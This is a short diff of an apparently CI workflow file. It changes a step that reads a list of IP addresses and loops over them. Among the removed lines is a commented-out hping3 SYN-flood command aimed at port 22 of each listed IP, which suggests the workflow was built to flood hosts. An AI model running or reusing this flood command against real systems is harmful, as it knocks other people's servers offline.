@@ -84,9 +84,7 @@ jobs:
 
       - name: Step 2
         run: |
-          echo $IP_LIST
-          # echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
-          # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
+          echo IP_LIST=$IP_LIST
 
           IFS=' ' read -ra IP_LIST <<< "$IP_LIST"
           for IP in "${IP_LIST[@]}"; do
